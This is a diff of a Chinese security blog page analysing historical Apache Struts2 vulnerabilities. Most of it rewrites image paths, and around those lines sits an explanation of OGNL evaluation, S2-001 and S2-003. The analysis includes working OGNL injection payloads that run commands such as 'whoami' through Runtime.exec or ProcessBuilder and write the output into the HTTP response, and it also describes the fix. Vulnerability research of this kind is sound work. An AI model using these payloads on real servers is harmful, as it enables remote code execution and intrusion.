@@ -20,109 +20,109 @@
 <meta property="og:site_name" content="0kami&#39;s Blog">
 <meta property="og:description" content="0x00 前言 17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200506154002054.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428211153680.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428212308880.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428213206168.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428220429903.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428220447992.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428221026617.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428223750035.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428231900257.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430155156109.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430155231489.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430155418664.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430232206989.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430232635455.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430234629782.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507101610804.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507102155210.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507102334789.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103428140.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103621957.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103632321.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103642250.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507110201209.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509111903026.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509111939166.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509112218065.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509114347567.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509120444634.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509202547849.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509202741614.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509204915751.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511171450014.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511171056619.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511204523185.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511222139049.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511223638532.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519154216690.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513145252050.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513145417046.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513145546225.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513150115678.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513150240332.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513151342610.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513151651915.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513151842698.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513155116772.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514151446611.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514150911888.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514151844894.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514152500049.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514152517255.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514165546294.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514202040764.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514202919865.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514173311368.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514173631503.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200515154730941.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200515154855569.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519143433067.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519144431546.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519144525695.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519144603429.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519152941105.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519153530702.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519153555655.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520223124404.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520223603177.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520223738228.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520230704180.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520233839824.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520233957407.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520234647887.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521112254951.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521154143972.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521154319856.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521154524558.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155036903.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155309089.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155346720.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155451100.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155901705.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155825583.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521172344561.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521204140738.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522100814912.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522101114659.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522101244620.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522102217477.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522102927472.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522103937515.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522111039529.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522111238176.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522111315111.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522152919691.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522153229727.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522153556365.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522154209594.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522154315511.png">
-<meta property="og:updated_time" content="2020-08-14T06:00:25.559Z">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200506154002054.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428211153680.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428212308880.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428213206168.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428220429903.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428220447992.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428221026617.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428223750035.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200428231900257.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200430155156109.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200430155231489.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200430155418664.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200430232206989.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200430232635455.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200430234629782.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507101610804.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507102155210.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507102334789.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507103428140.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507103621957.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507103632321.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507103642250.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200507110201209.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509111903026.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509111939166.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509112218065.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/talk_about_struts2/image-20200509114347567.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509120444634.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509202547849.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509202741614.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200509204915751.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200511171450014.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200511171056619.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200511204523185.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200511222139049.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200511223638532.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519154216690.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513145252050.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513145417046.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513145546225.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513150115678.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513150240332.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513151342610.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/talk_about_struts2/image-20200513151651915.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/talk_about_struts2/image-20200513151842698.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200513155116772.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514151446611.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/talk_about_struts2/image-20200514150911888.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514151844894.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514152500049.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514152517255.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514165546294.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514202040764.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514202919865.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514173311368.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200514173631503.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200515154730941.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200515154855569.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519143433067.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519144431546.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519144525695.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519144603429.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519152941105.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519153530702.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200519153555655.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520223124404.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520223603177.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520223738228.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520230704180.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520233839824.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520233957407.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200520234647887.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521112254951.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521154143972.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521154319856.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521154524558.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521155036903.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521155309089.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521155346720.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521155451100.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521155901705.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521155825583.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521172344561.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200521204140738.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522100814912.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522101114659.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522101244620.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522102217477.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522102927472.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522103937515.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522111039529.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522111238176.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522111315111.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522152919691.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522153229727.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522153556365.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522154209594.png">
+<meta property="og:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200522154315511.png">
+<meta property="og:updated_time" content="2020-11-18T14:06:51.906Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【notes】struts2历史漏洞分析">
 <meta name="twitter:description" content="0x00 前言 17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD">
-<meta name="twitter:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200506154002054.png">
+<meta name="twitter:image" content="http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/image-20200506154002054.png">
 
   <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
@@ -259,7 +259,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用静态函数 执行命令</span></span><br><span class="line">Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')"</span>, context);</span><br><span class="line">Ognl.setValue(<span class="string">"(\"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')\")(bla)(bla)"</span>,context,<span class="string">""</span>);</span><br></pre></td></tr></table></figure>
 <p>更多用法看<a href="http://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">http://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
 <p>其中关于<code>setValue</code>的利用用的是Expression Evaluation部分，<code>(1)(2)(3)</code>中<code>(1)(2)</code>被作为一个整体解析，对于<code>(1)</code>做表达式的解析，如果你用<code>getValue((1)(2))</code>会发现其实也能执行命令，而<code>setValue((1)(2)(3))</code>需要double evaluation，实际上变成<code>((1)(2))(3)</code>，在后续调用<code>setValueBody</code>函数时取出的<code>children[0]</code>就是<code>(1)(2)</code>，等同于调用<code>Ognl.getValue((1)(2))</code>的效果。所以这里调用<code>setValue</code>也同样可以达成<code>getValue</code>的计算OGNL表达式的效果。</p>
-<p><img src="/assets/talk_about_struts2/image-20200506154002054.png" alt="image-20200506154002054"></p>
+<p><img src="image-20200506154002054.png" alt="image-20200506154002054"></p>
 <p>同样，我们也可以利用<code>children[1]</code>的位置，如<code>(1)((2)(3))</code>把payload放到<code>(2)(3)</code></p>
 <p>关于<code>setValue</code>函数的另一种利用方法S2-009的方式<code>a[(1)(2)]</code>，其中<code>(1)(2)</code>后续会单独拿出来被当作OGNL表达式执行。</p>
 <h1 id="0x02-历史版本回顾"><a href="#0x02-历史版本回顾" class="headerlink" title="0x02 历史版本回顾"></a>0x02 历史版本回顾</h1><hr>
@@ -268,16 +268,16 @@
 <p>source: 使用了<code>s:textfield</code>标签用于表单生成，当用户输入不合法时，将用户的输入内容渲染到返回的页面上</p>
 <p>sink: jsp渲染调用<code>doEndTag</code>，后续由于识别出用户输入中OGNL表达式而调用<code>Ognl.getValue</code></p>
 <h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>主要出问题的是JSP中<code>&lt;s:textfield&gt;</code>标签，Struts2里处理textfield的是<code>org.apache.struts2.components.UIBean</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200428211153680.png" alt="image-20200428211153680"></p>
-<p><img src="/assets/talk_about_struts2/image-20200428212308880.png" alt="image-20200428212308880"></p>
+<p><img src="image-20200428211153680.png" alt="image-20200428211153680"></p>
+<p><img src="image-20200428212308880.png" alt="image-20200428212308880"></p>
 <p>看到在处理params时，当parameters里不存在<code>value</code>这个key的时候，会进到执行name相对应的value上来。并且<code>altSyntax</code>默认配置为<code>true</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200428213206168.png" alt="image-20200428213206168"></p>
+<p><img src="image-20200428213206168.png" alt="image-20200428213206168"></p>
 <p>会在当前的<code>name</code>左右加上OGNL表达式的标识<code>%{name}</code>，这里的name是<code>&lt;s:textfield name=&quot;name&quot;</code>，name字段的值，比如这里<code>name=&quot;username&quot;</code>，此时会变成<code>%{username}</code>.继续往下跟</p>
-<p><img src="/assets/talk_about_struts2/image-20200428220429903.png" alt="image-20200428220429903"></p>
-<p><img src="/assets/talk_about_struts2/image-20200428220447992.png" alt="image-20200428220447992"></p>
+<p><img src="image-20200428220429903.png" alt="image-20200428220429903"></p>
+<p><img src="image-20200428220447992.png" alt="image-20200428220447992"></p>
 <p>这里的String类型的转化主要用了<code>TextParesUtil.translateVariables()</code>来处理，这里看看具体他怎么做的</p>
 <p><code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200428221026617.png" alt="image-20200428221026617"></p>
+<p><img src="image-20200428221026617.png" alt="image-20200428221026617"></p>
 <p>这里会去判断传入的expression是否是OGNL表达式的格式的<code>%{xxx}</code>，如果是的话，就会去<code>OgnlValueStack</code>里面去找对应的内容(这块就是OGNL表达式的计算结果，<code>findValue</code>函数后续会去调用<code>OgnlUtil.getValue</code>，详细的可以看我基础里列的文章)</p>
 <p>所以这里我们第一遍传入的<code>%{name}</code>会解析获得对应的值<code>%{@java.lang.Runtime.....}</code></p>
 <p>第二遍会去解析<code>%{@java.lang.Runtime....}</code>，这里执行了我们想要执行的命令。</p>
@@ -285,37 +285,37 @@
 <p>这里S2-001其实是会直接回显的，将替换原有的input标签的内容，这里换一种方式来进行回显，利用Struts2的HttpServletResponse来写入内容。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(xxxxxx),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br></pre></td></tr></table></figure>
 <p>先从上下文context中取出<code>HttpServletResponse</code>的实例，用到的实际是<code>HttpServletResponseWrapper</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200428223750035.png" alt="image-20200428223750035"></p>
+<p><img src="image-20200428223750035.png" alt="image-20200428223750035"></p>
 <p>然后获取当前response的writer对象，在利用该writer来写入任意内容</p>
 <p>比如</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
 <p>当然你也可以替换成执行命令后的内容</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),</span><br><span class="line">#is=#pb.getInputStream(),</span><br><span class="line">#isr=new InputStreamReader(#is),</span><br><span class="line">#br=new BufferedReader(#isr),</span><br><span class="line">#chars=new char[500],</span><br><span class="line">#br.read(#chars),</span><br><span class="line">#str=new java.lang.String(#chars),</span><br><span class="line">// 上面主要获取执行后的内容，下面主要做回显操作</span><br><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(#str),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br><span class="line"></span><br><span class="line">%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>在&gt;=2.0.9版本的struts2上，<code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code>做了循环判断，不允许递归执行OGNL表达式</p>
-<p><img src="/assets/talk_about_struts2/image-20200428231900257.png" alt="image-20200428231900257"></p>
+<p><img src="image-20200428231900257.png" alt="image-20200428231900257"></p>
 <p>默认<code>maxLoopCount</code>为1，所以处理完<code>%{name}</code>后，不会再继续对他的值进行OGNL表达式的执行了。</p>
 <h2 id="2-S2-003"><a href="#2-S2-003" class="headerlink" title="2. S2-003"></a>2. <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">S2-003</a></h2><p>影响范围：2.0.0 - 2.0.11.2</p>
 <p>看官网的介绍，问题出在<code>ParametersInterceptor</code>，前面利用了<code>Ognl.getValue</code>来计算OGNL表达式，而S2-003用的则是<code>Ognl.setValue</code>，该函数也同样可以计算OGNL表达式</p>
 <p>source: 参数的key，使用unicode编码绕过<code>#</code>的检测</p>
 <p>sink: 调用<code>Ognl.setValue</code></p>
